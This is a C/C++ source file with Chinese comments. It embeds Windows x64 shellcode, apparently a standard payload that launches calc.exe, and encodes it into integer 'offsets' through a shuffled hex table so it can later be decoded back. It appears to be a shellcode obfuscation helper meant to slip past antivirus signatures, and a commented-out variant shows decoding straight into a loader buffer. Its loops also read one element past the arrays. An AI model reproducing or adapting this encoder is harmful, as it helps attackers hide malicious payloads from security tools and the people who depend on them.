#include <windows.h>
#include <stdio.h>

unsigned char op[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";

//char table[] = "0123456789abcdef";
char table[] = "87a13256bfc49ed0";

void output(unsigned char* buf,int len) {
	for (int i = 1; i <= len; i++)
	{
		printf("%02X ", buf[i - 1]);
		if (i % 16 == 0)
			printf("\n");
	}
	printf("\n\n");
}

void outputi(unsigned int* buf,int len) {
	printf("unsigned int op[] = {\n");
	for (int i = 1; i <= len; i++)
	{
		if (i < len) { printf("%2d,", buf[i - 1]); }
		else { printf("%2d", buf[i - 1]); }
		if (i % 16 == 0)
			printf("\n");
	}
	printf("};\n\n");
}

int htoi(char c) {

	
	if (c < 0x0a) {
		c = c + 0x30;
	}
	else {
		c = c - 0x0a + 0x61;
	}
	//printf("%02X %c\n", c, c);

	for (int i = 0; i < strlen(table);i++) {
		if (c == table[i])return i;
	}
	
	return 0xff;
}

char itoh(int i) {
	char c = table[i];

	if (c < 0x60) {
		c = c - 0x30;
	}
	else {
		c = c + 0x0a - 0x61;
	}
	return c;
}

//shellcode转偏移
unsigned int* offset(unsigned char* buf,int buflen) {
	int offlen = 2 * buflen;
	unsigned int* off = new unsigned int[offlen];
	char tmp = 0x00;

	for (int i=0,j=0; i <= buflen&&j<offlen; i++,j=2*i) {
		tmp = op[i] >> 4 & 0x0f;
		off[j] = htoi(tmp);
		tmp = op[i] & 0x0f;
		off[j + 1] = htoi(tmp);
		//printf("%d %d %d %d\n", i, j, off[j], off[j + 1]);
	}
	
	outputi(off, offlen);
	return off;
}

//偏移转shellcode
unsigned char* code(unsigned int* off,int offlen) {
	int len = offlen / 2;
	unsigned char* buf = new unsigned char[len];

	char tmp = 0x00;
	for (int i = 0, j = 0; i <= len && j < offlen; i++, j = 2 * i) {
		tmp = ((itoh(off[j]) << 4) & 0xf0) | (itoh(off[j + 1]) & 0x0f);
		buf[i] = tmp;
	}

	return buf;
}

//使用时可以修改为
//void code(void* buf, unsigned int* off, int offlen) {
//	int len = offlen / 2;
//	char tmp = 0x00;
//	for (int i = 0, j = 0; i < len && j < offlen; i++, j = 2 * i) {
//		tmp = ((itoh(off[j]) << 4) & 0xf0) | (itoh(off[j + 1]) & 0x0f);
//		((char*)buf)[i] = tmp;
//	}
//}

void main() {
	int len = sizeof(op);
	// 初始化
	output(op, len);

	// 计算偏移
	unsigned int* off = offset(op, len);

	// 偏移还原
	unsigned char* buf = code(off, 2 * len);

	// 偏移还原后
	output(buf, len);

}

